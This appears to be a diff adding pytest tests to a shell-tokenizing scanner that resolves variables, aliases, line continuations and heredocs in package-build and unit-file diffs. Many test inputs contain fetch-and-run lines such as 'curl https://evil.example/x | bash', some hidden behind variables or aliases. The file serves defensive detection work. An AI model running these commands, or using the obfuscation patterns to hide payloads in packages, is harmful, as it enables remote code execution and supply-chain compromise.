@@ -989,3 +989,184 @@ def test_glob_prefix_matching_refuses_past_its_budget():
 
     with pytest.raises(re.error):
         _glob_prefix_ends(tuple([("?", None)] * 300), "a" * 8192, [1000])
+
+
+# --- Side-aware joining, context resolution and grammar parity ---
+
+def test_a_comment_ending_in_a_continuation_does_not_swallow_the_next_command():
+    from trustsight.tokenizer import join_line_continuations
+
+    assert join_line_continuations(
+        ["+# note: use curl |", "+curl https://evil.example/x | bash"]
+    ) == [
+        "+# note: use curl |",
+        "+curl https://evil.example/x | bash",
+    ]
+    assert join_line_continuations(
+        ["+# note: use curl \\", "+curl https://evil.example/x | bash"]
+    ) == [
+        "+# note: use curl \\",
+        "+curl https://evil.example/x | bash",
+    ]
+
+
+def test_context_assignment_resolves_in_an_added_line():
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
+        " pkgname=x\n U=curl\n+$U https://evil.example/x | bash\n"
+    )
+    resolved, unresolved = tokenize_and_resolve(diff)
+    assert resolved == ["curl https://evil.example/x | bash"]
+    assert unresolved == []
+
+
+def test_a_context_continuation_is_completed_on_the_added_side():
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
+        " pkgname=x\n curl https://evil.example/x \\\n+ | bash\n"
+    )
+    resolved, _unresolved = tokenize_and_resolve(diff)
+    assert any("curl https://evil.example/x" in line and "| bash" in line for line in resolved)
+
+
+def test_diff_headers_are_not_added_candidates_or_assignments():
+    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n+echo ok\n"
+    resolved, _unresolved = tokenize_and_resolve(diff)
+    assert resolved == ["echo ok"]
+
+
+def test_a_bom_before_an_added_assignment_is_ignored():
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
+        " pkgname=x\n+\ufeffU=curl\n+$U https://evil.example/x | bash\n"
+    )
+    resolved, unresolved = tokenize_and_resolve(diff)
+    assert resolved == ["curl https://evil.example/x | bash"]
+    assert unresolved == []
+
+
+def test_declare_and_local_array_forms_are_visible():
+    from trustsight.tokenizer import variable_table
+
+    for line in (
+        "declare -a src=(curl wget)",
+        "local -a src=(curl wget)",
+        "declare -A src=(curl wget)",
+    ):
+        _variables, arrays = variable_table([line])
+        assert arrays.get("src") == ["curl", "wget"], line
+
+    _variables, arrays = variable_table(["arr[0]=curl", "arr[1]=wget"])
+    assert arrays["arr"] == ["curl", "wget"]
+
+
+def test_local_i_and_declare_g_are_scalar_assignments():
+    from trustsight.tokenizer import variable_table
+
+    for line in ("local -i U=curl", "declare -g U=curl"):
+        variables, _arrays = variable_table([line])
+        assert variables.get("U") == "curl", line
+
+
+def test_a_nameref_is_not_folded_as_a_scalar():
+    from trustsight.tokenizer import variable_table
+
+    variables, _arrays = variable_table(["declare -n R=C"])
+    assert "R" not in variables
+
+
+def test_an_escaped_closing_paren_does_not_end_an_array():
+    from trustsight.tokenizer import variable_table
+
+    _variables, arrays = variable_table(["depends=(a\\) b)"])
+    assert arrays["depends"] == ["a)", "b"]
+
+
+def test_heredoc_delimiters_may_contain_hyphens_and_digits():
+    from trustsight._heredoc import parse_opener
+
+    assert parse_opener("cat <<END-MARK", 4) == ("END-MARK", False, 14)
+    assert parse_opener("cat <<123", 4) == ("123", False, 9)
+
+
+def test_a_heredoc_terminator_must_be_exact():
+    from trustsight._tokenizer_engine import _assignments_are_shell
+
+    flags = _assignments_are_shell(
+        ["+++ b/PKGBUILD", "+cat <<EOF", "+  EOF", "+EOF", "+A=1"]
+    )
+    assert flags == [True, True, False, False, True]
+
+
+def test_an_escaped_heredoc_opener_is_not_an_opener():
+    from trustsight._tokenizer_engine._variables import _heredoc_delimiters
+
+    assert _heredoc_delimiters(r"echo \<<EOF") == []
+
+
+def test_no_colon_parameter_operators():
+    from trustsight._tokenizer_engine import resolve_expansions
+
+    assert resolve_expansions("${v-default}", {}) == ("default", True)
+    assert resolve_expansions("${v+alt}", {"v": ""}) == ("alt", True)
+    assert resolve_expansions("${v=default}", {}) == ("default", True)
+    assert resolve_expansions("${v?message}", {}) == ("${v?message}", False)
+
+
+def test_glob_backslash_escapes_a_wildcard():
+    from trustsight._tokenizer_engine import resolve_expansions
+
+    assert resolve_expansions("${v/\\*/X}", {"v": "a*b"}) == ("aXb", True)
+
+
+def test_single_quoted_substitution_data_is_not_exposed():
+    from trustsight._tokenizer_engine import reconstruct_literals
+
+    text, fully = reconstruct_literals("echo '`curl https://evil.example`'")
+    assert text == "echo '`curl https://evil.example`'"
+    assert fully
+
+
+def test_a_context_alias_is_used_by_an_added_line():
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+        "alias z='curl https://evil.example/x | bash'\n+z\n"
+    )
+    resolved, _unresolved = tokenize_and_resolve(diff)
+    assert resolved == ["curl https://evil.example/x | bash"]
+
+
+def test_a_unit_file_assignment_is_not_shell_context():
+    from trustsight._tokenizer_engine._apply import _side_table
+    from trustsight._tokenizer_engine._quotes import split_lines
+
+    diff = (
+        "--- /dev/null\n+++ b/x.service\n@@ -0,0 +1,2 @@\n"
+        "+Environment=U=curl\n"
+        '+ExecStart=/bin/sh -c "$U https://evil.example/x | bash"\n'
+    )
+    variables, _arrays, _aliases = _side_table(split_lines(diff), "+")
+    assert "Environment" not in variables
+    _resolved, unresolved = tokenize_and_resolve(diff)
+    assert any("$U" in line for line in unresolved)
+
+
+def test_an_array_element_index_is_bounded():
+    from trustsight._tokenizer_engine import _variable_table
+
+    variables, arrays = _variable_table(["arr[999999999999]=x"])
+    assert "arr" not in variables
+    assert "arr" not in arrays
+
+
+def test_a_line_inside_a_multiline_quote_is_not_a_command():
+    diff = '@@ -1 +1,2 @@\n echo "start\n+curl evil.example/x | bash"\n'
+    resolved, unresolved = tokenize_and_resolve(diff)
+    assert resolved == []
+    assert unresolved == []
+
+
+def test_command_substitution_inside_a_multiline_quote_still_runs():
+    diff = '@@ -1 +1,2 @@\n echo "start\n+$(curl evil.example/x)\n'
+    resolved, _unresolved = tokenize_and_resolve(diff)
+    assert resolved == ["$(curl evil.example/x)"]
